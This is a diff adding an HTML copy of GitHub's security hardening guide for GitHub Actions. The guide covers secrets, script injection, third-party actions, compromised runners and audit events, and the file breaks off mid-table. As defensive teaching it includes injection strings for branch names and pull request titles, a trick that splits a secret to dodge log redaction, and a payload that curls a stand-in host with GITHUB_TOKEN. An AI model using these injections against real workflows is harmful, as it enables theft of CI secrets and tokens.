@@ -1,0 +1,1229 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="generator" content="pandoc" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, user-scalable=yes"
+    />
+    <title>Security hardening for GitHub Actions</title>
+    <style type="text/css">
+      code {
+        white-space: pre-wrap;
+      }
+      span.smallcaps {
+        font-variant: small-caps;
+      }
+      span.underline {
+        text-decoration: underline;
+      }
+      div.column {
+        display: inline-block;
+        vertical-align: top;
+        width: 50%;
+      }
+    </style>
+  </head>
+  <body>
+    <header id="title-block-header">
+      <h1 class="title">Security hardening for GitHub Actions</h1>
+    </header>
+    <p>
+      {% data reusables.actions.enterprise-beta %} {% data
+      reusables.actions.enterprise-github-hosted-runners %} {% data
+      reusables.actions.ae-beta %}
+    </p>
+    <h2 id="overview">Overview</h2>
+    <p>
+      This guide explains how to configure security hardening for certain {%
+      data variables.product.prodname_actions %} features. If the {% data
+      variables.product.prodname_actions %} concepts are unfamiliar, see “<a
+        href="/actions/getting-started-with-github-actions/core-concepts-for-github-actions"
+        >Core concepts for GitHub Actions</a
+      >.”
+    </p>
+    <h2 id="using-secrets">Using secrets</h2>
+    <p>
+      Sensitive values should never be stored as plaintext in workflow files,
+      but rather as secrets.
+      <a
+        href="/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets"
+        >Secrets</a
+      >
+      can be configured at the organization{% ifversion fpt or ghes &gt; 3.0 or
+      ghae %}, repository, or environment{% else %} or repository{% endif %}
+      level, and allow you to store sensitive information in {% data
+      variables.product.product_name %}.
+    </p>
+    <p>
+      Secrets use
+      <a
+        href="https://libsodium.gitbook.io/doc/public-key_cryptography/sealed_boxes"
+        >Libsodium sealed boxes</a
+      >, so that they are encrypted before reaching {% data
+      variables.product.product_name %}. This occurs when the secret is
+      submitted
+      <a
+        href="/actions/configuring-and-managing-workflows/creating-and-storing-encrypted-secrets#creating-encrypted-secrets-for-a-repository"
+        >using the UI</a
+      >
+      or through the <a href="/rest/reference/actions#secrets">REST API</a>.
+      This client-side encryption helps minimize the risks related to accidental
+      logging (for example, exception logs and request logs, among others)
+      within {% data variables.product.product_name %}’s infrastructure. Once
+      the secret is uploaded, {% data variables.product.product_name %} is then
+      able to decrypt it so that it can be injected into the workflow runtime.
+    </p>
+    <p>
+      To help prevent accidental disclosure, {% data
+      variables.product.product_name %} uses a mechanism that attempts to redact
+      any secrets that appear in run logs. This redaction looks for exact
+      matches of any configured secrets, as well as common encodings of the
+      values, such as Base64. However, because there are multiple ways a secret
+      value can be transformed, this redaction is not guaranteed. As a result,
+      there are certain proactive steps and good practices you should follow to
+      help ensure secrets are redacted, and to limit other risks associated with
+      secrets:
+    </p>
+    <ul>
+      <li>
+        <strong>Never use structured data as a secret</strong>
+        <ul>
+          <li>
+            Structured data can cause secret redaction within logs to fail,
+            because redaction largely relies on finding an exact match for the
+            specific secret value. For example, do not use a blob of JSON, XML,
+            or YAML (or similar) to encapsulate a secret value, as this
+            significantly reduces the probability the secrets will be properly
+            redacted. Instead, create individual secrets for each sensitive
+            value.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Register all secrets used within workflows</strong>
+        <ul>
+          <li>
+            If a secret is used to generate another sensitive value within a
+            workflow, that generated value should be formally
+            <a
+              href="https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret"
+              >registered as a secret</a
+            >, so that it will be redacted if it ever appears in the logs. For
+            example, if using a private key to generate a signed JWT to access a
+            web API, be sure to register that JWT as a secret or else it won’t
+            be redacted if it ever enters the log output.
+          </li>
+          <li>
+            Registering secrets applies to any sort of transformation/encoding
+            as well. If your secret is transformed in some way (such as Base64
+            or URL-encoded), be sure to register the new value as a secret too.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Audit how secrets are handled</strong>
+        <ul>
+          <li>
+            Audit how secrets are used, to help ensure they’re being handled as
+            expected. You can do this by reviewing the source code of the
+            repository executing the workflow, and checking any actions used in
+            the workflow. For example, check that they’re not sent to unintended
+            hosts, or explicitly being printed to log output.
+          </li>
+          <li>
+            View the run logs for your workflow after testing valid/invalid
+            inputs, and check that secrets are properly redacted, or not shown.
+            It’s not always obvious how a command or tool you’re invoking will
+            send errors to <code>STDOUT</code> and <code>STDERR</code>, and
+            secrets might subsequently end up in error logs. As a result, it is
+            good practice to manually review the workflow logs after testing
+            valid and invalid inputs.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Use credentials that are minimally scoped</strong>
+        <ul>
+          <li>
+            Make sure the credentials being used within workflows have the least
+            privileges required, and be mindful that any user with write access
+            to your repository has read access to all secrets configured in your
+            repository. {% ifversion fpt or ghes &gt; 3.1 or ghae-next %}
+          </li>
+          <li>
+            Actions can use the <code>GITHUB_TOKEN</code> by accessing it from
+            the <code>github.token</code> context. For more information, see “<a
+              href="/actions/reference/context-and-expression-syntax-for-github-actions#github-context"
+              >Context and expression syntax for {% data
+              variables.product.prodname_actions %}</a
+            >.” You should therefore make sure that the
+            <code>GITHUB_TOKEN</code> is granted the minimum required
+            permissions. It’s good security practice to set the default
+            permission for the <code>GITHUB_TOKEN</code> to read access only for
+            repository contents. The permissions can then be increased, as
+            required, for individual jobs within the workflow file. For more
+            information, see “<a
+              href="/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token"
+              >Authentication in a workflow</a
+            >.” {% endif %}
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Audit and rotate registered secrets</strong>
+        <ul>
+          <li>
+            Periodically review the registered secrets to confirm they are still
+            required. Remove those that are no longer needed.
+          </li>
+          <li>
+            Rotate secrets periodically to reduce the window of time during
+            which a compromised secret is valid. {% ifversion fpt or ghes &gt;
+            3.0 or ghae %}
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Consider requiring review for access to secrets</strong>
+        <ul>
+          <li>
+            You can use required reviewers to protect environment secrets. A
+            workflow job cannot access environment secrets until approval is
+            granted by a reviewer. For more information about storing secrets in
+            environments or requiring reviews for environments, see “<a
+              href="/actions/reference/encrypted-secrets"
+              >Encrypted secrets</a
+            >” and “<a href="/actions/reference/environments">Environments</a>.”
+            {% endif %}
+          </li>
+        </ul>
+      </li>
+    </ul>
+    <h2 id="using-codeowners-to-monitor-changes">
+      Using <code>CODEOWNERS</code> to monitor changes
+    </h2>
+    <p>
+      You can use the <code>CODEOWNERS</code> feature to control how changes are
+      made to your workflow files. For example, if all your workflow files are
+      stored in <code>.github/workflows</code>, you can add this directory to
+      the code owners list, so that any proposed changes to these files will
+      first require approval from a designated reviewer.
+    </p>
+    <p>
+      For more information, see “<a
+        href="/github/creating-cloning-and-archiving-repositories/about-code-owners"
+        >About code owners</a
+      >.”
+    </p>
+    <h2 id="understanding-the-risk-of-script-injections">
+      Understanding the risk of script injections
+    </h2>
+    <p>
+      When creating workflows,
+      <a href="/actions/creating-actions/about-actions">custom actions</a>, and
+      <a href="/actions/creating-actions/creating-a-composite-run-steps-action"
+        >composite run step</a
+      >
+      actions, you should always consider whether your code might execute
+      untrusted input from attackers. This can occur when an attacker adds
+      malicious commands and scripts to a context. When your workflow runs,
+      those strings might be interpreted as code which is then executed on the
+      runner.
+    </p>
+    <p>
+      Attackers can add their own malicious content to the
+      <a
+        href="/actions/reference/context-and-expression-syntax-for-github-actions#github-context"
+        ><code>github</code> context</a
+      >, which should be treated as potentially untrusted input. These contexts
+      typically end with <code>body</code>, <code>default_branch</code>,
+      <code>email</code>, <code>head_ref</code>, <code>label</code>,
+      <code>message</code>, <code>name</code>,
+      <code>page_name</code>,<code>ref</code>, and <code>title</code>. For
+      example: <code>github.event.issue.title</code>, or
+      <code>github.event.pull_request.body</code>.
+    </p>
+    <p>
+      You should ensure that these values do not flow directly into workflows,
+      actions, API calls, or anywhere else where they could be interpreted as
+      executable code. By adopting the same defensive programming posture you
+      would use for any other privileged application code, you can help security
+      harden your use of {% data variables.product.prodname_actions %}. For
+      information on some of the steps an attacker could take, see
+      <a
+        href="/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner"
+        >"Potential impact of a compromised runner</a
+      >."
+    </p>
+    <p>
+      In addition, there are other less obvious sources of potentially untrusted
+      input, such as branch names and email addresses, which can be quite
+      flexible in terms of their permitted content. For example,
+      <code>zzz";echo${IFS}"hello";#</code> would be a valid branch name and
+      would be a possible attack vector for a target repository.
+    </p>
+    <p>
+      The following sections explain how you can help mitigate the risk of
+      script injection.
+    </p>
+    <h3 id="example-of-a-script-injection-attack">
+      Example of a script injection attack
+    </h3>
+    <p>
+      A script injection attack can occur directly within a workflow’s inline
+      script. In the following example, an action uses an expression to test the
+      validity of a pull request title, but also adds the risk of script
+      injection:
+    </p>
+    <p>{% raw %}</p>
+    <pre><code>      - name: Check PR title
+        run: |
+          title=&quot;${{ github.event.pull_request.title }}&quot;
+          if [[ $title =~ ^octocat ]]; then
+          echo &quot;PR title starts with &#39;octocat&#39;&quot;
+          exit 0
+          else
+          echo &quot;PR title did not start with &#39;octocat&#39;&quot;
+          exit 1
+          fi</code></pre>
+    <p>{% endraw %}</p>
+    <p>
+      This example is vulnerable to script injection because the
+      <code>run</code> command executes within a temporary shell script on the
+      runner. Before the shell script is run, the expressions inside {% raw
+      %}<code>${{ }}</code>{% endraw %} are evaluated and then substituted with
+      the resulting values, which can make it vulnerable to shell command
+      injection.
+    </p>
+    <p>
+      To inject commands into this workflow, the attacker could create a pull
+      request with a title of <code>a"; ls $GITHUB_WORKSPACE"</code>:
+    </p>
+    <figure>
+      <img
+        src="/assets/images/help/images/example-script-injection-pr-title.png"
+        alt="Example of script injection in PR title"
+      />
+      <figcaption>Example of script injection in PR title</figcaption>
+    </figure>
+    <p>
+      In this example, the <code>"</code> character is used to interrupt the {%
+      raw %}<code>title="${{ github.event.pull_request.title }}"</code>{% endraw
+      %} statement, allowing the <code>ls</code> command to be executed on the
+      runner. You can see the output of the <code>ls</code> command in the log:
+    </p>
+    <figure>
+      <img
+        src="/assets/images/help/images/example-script-injection-result.png"
+        alt="Example result of script injection"
+      />
+      <figcaption>Example result of script injection</figcaption>
+    </figure>
+    <h2 id="good-practices-for-mitigating-script-injection-attacks">
+      Good practices for mitigating script injection attacks
+    </h2>
+    <p>
+      There are a number of different approaches available to help you mitigate
+      the risk of script injection:
+    </p>
+    <h3 id="using-an-action-instead-of-an-inline-script-recommended">
+      Using an action instead of an inline script (recommended)
+    </h3>
+    <p>
+      The recommended approach is to create an action that processes the context
+      value as an argument. This approach is not vulnerable to the injection
+      attack, as the context value is not used to generate a shell script, but
+      is instead passed to the action as an argument:
+    </p>
+    <p>{% raw %}</p>
+    <pre><code>uses: fakeaction/checktitle@v3
+with:
+    title: ${{ github.event.pull_request.title }}</code></pre>
+    <p>{% endraw %}</p>
+    <h3 id="using-an-intermediate-environment-variable">
+      Using an intermediate environment variable
+    </h3>
+    <p>
+      For inline scripts, the preferred approach to handling untrusted input is
+      to set the value of the expression to an intermediate environment
+      variable.
+    </p>
+    <p>
+      The following example uses Bash to process the
+      <code>github.event.pull_request.title</code> value as an environment
+      variable:
+    </p>
+    <p>{% raw %}</p>
+    <pre><code>      - name: Check PR title
+        env:
+          TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          if [[ &quot;$TITLE&quot; =~ ^octocat ]]; then
+          echo &quot;PR title starts with &#39;octocat&#39;&quot;
+          exit 0
+          else
+          echo &quot;PR title did not start with &#39;octocat&#39;&quot;
+          exit 1
+          fi</code></pre>
+    <p>{% endraw %}</p>
+    <p>In this example, the attempted script injection is unsuccessful:</p>
+    <figure>
+      <img
+        src="/assets/images/help/images/example-script-injection-mitigated.png"
+        alt="Example of mitigated script injection"
+      />
+      <figcaption>Example of mitigated script injection</figcaption>
+    </figure>
+    <p>
+      With this approach, the value of the {% raw %}<code
+        >${{ github.event.issue.title }}</code
+      >{% endraw %} expression is stored in memory and used as a variable, and
+      doesn’t interact with the script generation process. In addition, consider
+      using double quote shell variables to avoid
+      <a href="https://github.com/koalaman/shellcheck/wiki/SC2086"
+        >word splitting</a
+      >, but this is
+      <a href="https://mywiki.wooledge.org/BashPitfalls">one of many</a> general
+      recommendations for writing shell scripts, and is not specific to {% data
+      variables.product.prodname_actions %}.
+    </p>
+    <h3 id="using-codeql-to-analyze-your-code">
+      Using CodeQL to analyze your code
+    </h3>
+    <p>
+      To help you manage the risk of dangerous patterns as early as possible in
+      the development lifecycle, the {% data variables.product.prodname_dotcom
+      %} Security Lab has developed
+      <a
+        href="https://github.com/github/codeql/tree/main/javascript/ql/src/experimental/Security/CWE-094"
+        >CodeQL queries</a
+      >
+      that repository owners can
+      <a
+        href="/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#running-additional-queries"
+        >integrate</a
+      >
+      into their CI/CD pipelines. For more information, see “<a
+        href="/github/finding-security-vulnerabilities-and-errors-in-your-code/about-code-scanning"
+        >About code scanning</a
+      >.”
+    </p>
+    <p>
+      The scripts currently depend on the CodeQL JavaScript libraries, which
+      means that the analyzed repository must contain at least one JavaScript
+      file and that CodeQL must be
+      <a
+        href="/github/finding-security-vulnerabilities-and-errors-in-your-code/configuring-code-scanning#changing-the-languages-that-are-analyzed"
+        >configured to analyze this language</a
+      >.
+    </p>
+    <ul>
+      <li>
+        <code>ExpressionInjection.ql</code>: Covers the expression injections
+        described in this article, and is considered to be reasonably accurate.
+        However, it doesn’t perform data flow tracking between workflow steps.
+      </li>
+      <li>
+        <code>UntrustedCheckout.ql</code>: This script’s results require manual
+        review to determine whether the code from a pull request is actually
+        treated in an unsafe manner. For more information, see “<a
+          href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests"
+          >Keeping your GitHub Actions and workflows secure: Preventing pwn
+          requests</a
+        >” on the {% data variables.product.prodname_dotcom %} Security Lab
+        blog.
+      </li>
+    </ul>
+    <h3 id="restricting-permissions-for-tokens">
+      Restricting permissions for tokens
+    </h3>
+    <p>
+      To help mitigate the risk of an exposed token, consider restricting the
+      assigned permissions. For more information, see “<a
+        href="/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token"
+        >Modifying the permissions for the GITHUB_TOKEN</a
+      >.”
+    </p>
+    <h2 id="using-third-party-actions">Using third-party actions</h2>
+    <p>
+      The individual jobs in a workflow can interact with (and compromise) other
+      jobs. For example, a job querying the environment variables used by a
+      later job, writing files to a shared directory that a later job processes,
+      or even more directly by interacting with the Docker socket and inspecting
+      other running containers and executing commands in them.
+    </p>
+    <p>
+      This means that a compromise of a single action within a workflow can be
+      very significant, as that compromised action would have access to all
+      secrets configured on your repository, and may be able to use the
+      <code>GITHUB_TOKEN</code> to write to the repository. Consequently, there
+      is significant risk in sourcing actions from third-party repositories on
+      {% data variables.product.prodname_dotcom %}. For information on some of
+      the steps an attacker could take, see
+      <a
+        href="/actions/learn-github-actions/security-hardening-for-github-actions#potential-impact-of-a-compromised-runner"
+        >"Potential impact of a compromised runner</a
+      >."
+    </p>
+    <p>You can help mitigate this risk by following these good practices:</p>
+    <ul>
+      <li>
+        <p><strong>Pin actions to a full length commit SHA</strong></p>
+        <p>
+          Pinning an action to a full length commit SHA is currently the only
+          way to use an action as an immutable release. Pinning to a particular
+          SHA helps mitigate the risk of a bad actor adding a backdoor to the
+          action’s repository, as they would need to generate a SHA-1 collision
+          for a valid Git object payload.
+        </p>
+        <p>{% ifversion ghes &lt; 3.1 %} {% warning %}</p>
+        <p>
+          <strong>Warning:</strong> The short version of the commit SHA is
+          insecure and should never be used for specifying an action’s Git
+          reference. Because of how repository networks work, any user can fork
+          the repository and push a crafted commit to it that collides with the
+          short SHA. This causes subsequent clones at that SHA to fail because
+          it becomes an ambiguous commit. As a result, any workflows that use
+          the shortened SHA will immediately fail.
+        </p>
+        <p>{% endwarning %} {% endif %}</p>
+      </li>
+      <li>
+        <p><strong>Audit the source code of the action</strong></p>
+        <p>
+          Ensure that the action is handling the content of your repository and
+          secrets as expected. For example, check that secrets are not sent to
+          unintended hosts, or are not inadvertently logged.
+        </p>
+      </li>
+      <li>
+        <p>
+          <strong>Pin actions to a tag only if you trust the creator</strong>
+        </p>
+        <p>
+          Although pinning to a commit SHA is the most secure option, specifying
+          a tag is more convenient and is widely used. If you’d like to specify
+          a tag, then be sure that you trust the action’s creators. The
+          ‘Verified creator’ badge on {% data
+          variables.product.prodname_marketplace %} is a useful signal, as it
+          indicates that the action was written by a team whose identity has
+          been verified by {% data variables.product.prodname_dotcom %}. Note
+          that there is risk to this approach even if you trust the author,
+          because a tag can be moved or deleted if a bad actor gains access to
+          the repository storing the action.
+        </p>
+      </li>
+    </ul>
+    <h2 id="potential-impact-of-a-compromised-runner">
+      Potential impact of a compromised runner
+    </h2>
+    <p>
+      These sections consider some of the steps an attacker can take if they’re
+      able to run malicious commands on a {% data
+      variables.product.prodname_actions %} runner.
+    </p>
+    <h3 id="accessing-secrets">Accessing secrets</h3>
+    <p>
+      Workflows triggered using the <code>pull_request</code> event have
+      read-only permissions and have no access to secrets. However, these
+      permissions differ for various event triggers such as
+      <code>issue_comment</code>, <code>issues</code> and <code>push</code>,
+      where the attacker could attempt to steal repository secrets or use the
+      write permission of the job’s
+      <a
+        href="/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token"
+        ><code>GITHUB_TOKEN</code></a
+      >.
+    </p>
+    <ul>
+      <li>
+        If the secret or token is set to an environment variable, it can be
+        directly accessed through the environment using <code>printenv</code>.
+      </li>
+      <li>
+        If the secret is used directly in an expression, the generated shell
+        script is stored on-disk and is accessible.
+      </li>
+      <li>
+        <p>
+          For a custom action, the risk can vary depending on how a program is
+          using the secret it obtained from the argument:
+        </p>
+        <p>{% raw %}</p>
+        <pre><code>uses: fakeaction/publish@v3
+with:
+    key: ${{ secrets.PUBLISH_KEY }}</code></pre>
+        <p>{% endraw %}</p>
+      </li>
+    </ul>
+    <p>
+      Although {% data variables.product.prodname_actions %} scrubs secrets from
+      memory that are not referenced in the workflow (or an included action),
+      the <code>GITHUB_TOKEN</code> and any referenced secrets can be harvested
+      by a determined attacker.
+    </p>
+    <h3 id="exfiltrating-data-from-a-runner">
+      Exfiltrating data from a runner
+    </h3>
+    <p>
+      An attacker can exfiltrate any stolen secrets or other data from the
+      runner. To help prevent accidental secret disclosure, {% data
+      variables.product.prodname_actions %}
+      <a href="/actions/reference/encrypted-secrets#accessing-your-secrets"
+        >automatically redact secrets printed to the log</a
+      >, but this is not a true security boundary because secrets can be
+      intentionally sent to the log. For example, obfuscated secrets can be
+      exfiltrated using
+      <code>echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};</code>. In
+      addition, since the attacker may run arbitrary commands, they could use
+      HTTP requests to send secrets or other repository data to an external
+      server.
+    </p>
+    <h3 id="stealing-the-jobs-github_token">
+      Stealing the job’s <code>GITHUB_TOKEN</code>
+    </h3>
+    <p>
+      It is possible for an attacker to steal a job’s <code>GITHUB_TOKEN</code>.
+      The {% data variables.product.prodname_actions %} runner automatically
+      receives a generated <code>GITHUB_TOKEN</code> with permissions that are
+      limited to just the repository that contains the workflow, and the token
+      expires after the job has completed. Once expired, the token is no longer
+      useful to an attacker. To work around this limitation, they can automate
+      the attack and perform it in fractions of a second by calling an
+      attacker-controlled server with the token, for example:
+      <code>a"; set +e; curl http://example.lab?token=$GITHUB_TOKEN;#</code>.
+    </p>
+    <h3 id="modifying-the-contents-of-a-repository">
+      Modifying the contents of a repository
+    </h3>
+    <p>
+      The attacker server can use the {% data variables.product.prodname_dotcom
+      %} API to
+      <a
+        href="/actions/reference/authentication-in-a-workflow#permissions-for-the-github_token"
+        >modify repository content</a
+      >, including releases, if the assigned permissions of
+      <code>GITHUB_TOKEN</code>
+      <a
+        href="/actions/reference/authentication-in-a-workflow#modifying-the-permissions-for-the-github_token"
+        >are not restricted</a
+      >.
+    </p>
+    <h2 id="considering-cross-repository-access">
+      Considering cross-repository access
+    </h2>
+    <p>
+      {% data variables.product.prodname_actions %} is intentionally scoped for
+      a single repository at a time. The <code>GITHUB_TOKEN</code> grants the
+      same level of access as a write-access user, because any write-access user
+      can access this token by creating or modifying a workflow file{% ifversion
+      fpt or ghes &gt; 3.1 or ghae-next %}, elevating the permissions of the
+      <code>GITHUB_TOKEN</code> if necessary{% endif %}. Users have specific
+      permissions for each repository, so allowing the
+      <code>GITHUB_TOKEN</code> for one repository to grant access to another
+      would impact the {% data variables.product.prodname_dotcom %} permission
+      model if not implemented carefully. Similarly, caution must be taken when
+      adding {% data variables.product.prodname_dotcom %} authentication tokens
+      to a workflow, because this can also affect the {% data
+      variables.product.prodname_dotcom %} permission model by inadvertently
+      granting broad access to collaborators.
+    </p>
+    <p>
+      We have
+      <a href="https://github.com/github/roadmap/issues/74"
+        >a plan on the {% data variables.product.prodname_dotcom %} roadmap</a
+      >
+      to support a flow that allows cross-repository access within {% data
+      variables.product.product_name %}, but this is not yet a supported
+      feature. Currently, the only way to perform privileged cross-repository
+      interactions is to place a {% data variables.product.prodname_dotcom %}
+      authentication token or SSH key as a secret within the workflow. Because
+      many authentication token types do not allow for granular access to
+      specific resources, there is significant risk in using the wrong token
+      type, as it can grant much broader access than intended.
+    </p>
+    <p>
+      This list describes the recommended approaches for accessing repository
+      data within a workflow, in descending order of preference:
+    </p>
+    <ol type="1">
+      <li>
+        <strong>The <code>GITHUB_TOKEN</code></strong>
+        <ul>
+          <li>
+            This token is intentionally scoped to the single repository that
+            invoked the workflow, and {% ifversion fpt or ghes &gt; 3.1 or
+            ghae-next %}can have {% else %}has {% endif %}the same level of
+            access as a write-access user on the repository. The token is
+            created before each job begins and expires when the job is finished.
+            For more information, see “<a
+              href="/actions/configuring-and-managing-workflows/authenticating-with-the-github_token"
+              >Authenticating with the GITHUB_TOKEN</a
+            >.”
+          </li>
+          <li>
+            The <code>GITHUB_TOKEN</code> should be used whenever possible.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Repository deploy key</strong>
+        <ul>
+          <li>
+            Deploy keys are one of the only credential types that grant read or
+            write access to a single repository, and can be used to interact
+            with another repository within a workflow. For more information, see
+            “<a href="/developers/overview/managing-deploy-keys#deploy-keys"
+              >Managing deploy keys</a
+            >.”
+          </li>
+          <li>
+            Note that deploy keys can only clone and push to the repository
+            using Git, and cannot be used to interact with the REST or GraphQL
+            API, so they may not be appropriate for your requirements.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>{% data variables.product.prodname_github_app %} tokens</strong>
+        <ul>
+          <li>
+            {% data variables.product.prodname_github_apps %} can be installed
+            on select repositories, and even have granular permissions on the
+            resources within them. You could create a {% data
+            variables.product.prodname_github_app %} internal to your
+            organization, install it on the repositories you need access to
+            within your workflow, and authenticate as the installation within
+            your workflow to access those repositories.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>Personal access tokens</strong>
+        <ul>
+          <li>
+            You should never use personal access tokens from your own account.
+            These tokens grant access to all repositories within the
+            organizations that you have access to, as well as all personal
+            repositories in your user account. This indirectly grants broad
+            access to all write-access users of the repository the workflow is
+            in. In addition, if you later leave an organization, workflows using
+            this token will immediately break, and debugging this issue can be
+            challenging.
+          </li>
+          <li>
+            If a personal access token is used, it should be one that was
+            generated for a new account that is only granted access to the
+            specific repositories that are needed for the workflow. Note that
+            this approach is not scalable and should be avoided in favor of
+            alternatives, such as deploy keys.
+          </li>
+        </ul>
+      </li>
+      <li>
+        <strong>SSH keys on a user account</strong>
+        <ul>
+          <li>
+            Workflows should never use the SSH keys on a user account. Similar
+            to personal access tokens, they grant read/write permissions to all
+            of your personal repositories as well as all the repositories you
+            have access to through organization membership. This indirectly
+            grants broad access to all write-access users of the repository the
+            workflow is in. If you’re intending to use an SSH key because you
+            only need to perform repository clones or pushes, and do not need to
+            interact with public APIs, then you should use individual deploy
+            keys instead.
+          </li>
+        </ul>
+      </li>
+    </ol>
+    <h2 id="hardening-for-self-hosted-runners">
+      Hardening for self-hosted runners
+    </h2>
+    <p>
+      <strong>{% data variables.product.prodname_dotcom %}-hosted</strong>
+      runners execute code within ephemeral and clean isolated virtual machines,
+      meaning there is no way to persistently compromise this environment, or
+      otherwise gain access to more information than was placed in this
+      environment during the bootstrap process.
+    </p>
+    <p>
+      <strong>Self-hosted</strong> runners on {% data
+      variables.product.product_name %} do not have guarantees around running in
+      ephemeral clean virtual machines, and can be persistently compromised by
+      untrusted code in a workflow.
+    </p>
+    <p>
+      As a result, self-hosted runners should almost
+      <a
+        href="/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security-with-public-repositories"
+        >never be used for public repositories</a
+      >
+      on {% data variables.product.product_name %}, because any user can open
+      pull requests against the repository and compromise the environment.
+      Similarly, be cautious when using self-hosted runners on private
+      repositories, as anyone who can fork the repository and open a pull
+      request (generally those with read-access to the repository) are able to
+      compromise the self-hosted runner environment, including gaining access to
+      secrets and the <code>GITHUB_TOKEN</code> which{% ifversion fpt or ghes
+      &gt; 3.1 or ghae-next %}, depending on its settings, can grant {% else %}
+      grants {% endif %}write-access permissions on the repository. Although
+      workflows can control access to environment secrets by using environments
+      and required reviews, these workflows are not run in an isolated
+      environment and are still susceptible to the same risks when run on a
+      self-hosted runner.
+    </p>
+    <p>
+      When a self-hosted runner is defined at the organization or enterprise
+      level, {% data variables.product.product_name %} can schedule workflows
+      from multiple repositories onto the same runner. Consequently, a security
+      compromise of these environments can result in a wide impact. To help
+      reduce the scope of a compromise, you can create boundaries by organizing
+      your self-hosted runners into separate groups. For more information, see
+      “<a
+        href="/actions/hosting-your-own-runners/managing-access-to-self-hosted-runners-using-groups"
+        >Managing access to self-hosted runners using groups</a
+      >.”
+    </p>
+    <p>
+      You should also consider the environment of the self-hosted runner
+      machines: - What sensitive information resides on the machine configured
+      as a self-hosted runner? For example, private SSH keys, API access tokens,
+      among others. - Does the machine have network access to sensitive
+      services? For example, Azure or AWS metadata services. The amount of
+      sensitive information in this environment should be kept to a minimum, and
+      you should always be mindful that any user capable of invoking workflows
+      has access to this environment.
+    </p>
+    <p>
+      Some customers might attempt to partially mitigate these risks by
+      implementing systems that automatically destroy the self-hosted runner
+      after each job execution. However, this approach might not be as effective
+      as intended, as there is no way to guarantee that a self-hosted runner
+      only runs one job. Some jobs will use secrets as command-line arguments
+      which can be seen by another job running on the same runner, such as
+      <code>ps x -w</code>. This can lead to secret leakages.
+    </p>
+    <h2 id="auditing-data-variables.product.prodname_actions-events">
+      Auditing {% data variables.product.prodname_actions %} events
+    </h2>
+    <p>
+      You can use the audit log to monitor administrative tasks in an
+      organization. The audit log records the type of action, when it was run,
+      and which user account performed the action.
+    </p>
+    <p>
+      For example, you can use the audit log to track the
+      <code>org.update_actions_secret</code> event, which tracks changes to
+      organization secrets:
+      <img
+        src="/assets/images/help/repository/audit-log-entries.png"
+        alt="Audit log entries"
+      />
+    </p>
+    <p>
+      The following tables describe the {% data
+      variables.product.prodname_actions %} events that you can find in the
+      audit log. For more information on using the audit log, see “<a
+        href="/organizations/keeping-your-organization-secure/reviewing-the-audit-log-for-your-organization#searching-the-audit-log"
+        >Reviewing the audit log for your organization</a
+      >.”
+    </p>
+    <p>{% ifversion fpt %} ### Events for environments</p>
+    <table>
+      <colgroup>
+        <col style="width: 48%" />
+        <col style="width: 51%" />
+      </colgroup>
+      <thead>
+        <tr class="header">
+          <th>Action</th>
+          <th>Description</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="odd">
+          <td><code>environment.create_actions_secret</code></td>
+          <td>
+            Triggered when a secret is created in an environment. For more
+            information, see
+            <a href="/actions/reference/environments#environment-secrets"
+              >"Environment secrets</a
+            >."
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>environment.delete</code></td>
+          <td>
+            Triggered when an environment is deleted. For more information, see
+            <a href="/actions/reference/environments#deleting-an-environment"
+              >"Deleting an environment</a
+            >."
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>environment.remove_actions_secret</code></td>
+          <td>
+            Triggered when a secret is removed from an environment. For more
+            information, see
+            <a href="/actions/reference/environments#environment-secrets"
+              >"Environment secrets</a
+            >."
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>environment.update_actions_secret</code></td>
+          <td>
+            Triggered when a secret in an environment is updated. For more
+            information, see
+            <a href="/actions/reference/environments#environment-secrets"
+              >"Environment secrets</a
+            >."
+          </td>
+        </tr>
+      </tbody>
+    </table>
+    <p>{% endif %}</p>
+    <p>
+      {% ifversion fpt or ghes &gt; 2.21 %} ### Events for configuration changes
+      | Action | Description |——————|——————- |
+      <code>repo.actions_enabled</code> | Triggered when {% data
+      variables.product.prodname_actions %} is enabled for a repository. Can be
+      viewed using the UI. This event is not visible when you access the audit
+      log using the REST API. For more information, see “<a
+        href="#using-the-rest-api"
+        >Using the REST API</a
+      >.” {% endif %}
+    </p>
+    <h3 id="events-for-secret-management">Events for secret management</h3>
+    <table>
+      <colgroup>
+        <col style="width: 48%" />
+        <col style="width: 51%" />
+      </colgroup>
+      <thead>
+        <tr class="header">
+          <th>Action</th>
+          <th>Description</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr class="odd">
+          <td><code>org.create_actions_secret</code></td>
+          <td>
+            Triggered when a {% data variables.product.prodname_actions %}
+            secret is created for an organization. For more information, see “<a
+              href="/actions/reference/encrypted-secrets#creating-encrypted-secrets-for-an-organization"
+              >Creating encrypted secrets for an organization</a
+            >.”
+          </td>
+        </tr>
+        <tr class="even">
+          <td><code>org.remove_actions_secret</code></td>
+          <td>
+            Triggered when a {% data variables.product.prodname_actions %}
+            secret is removed.
+          </td>
+        </tr>
+        <tr class="odd">
+          <td><code>org.update_actions_secret</code></td>
+          <td>
+            Triggered when a {% data variables.product.prodname_actions %}
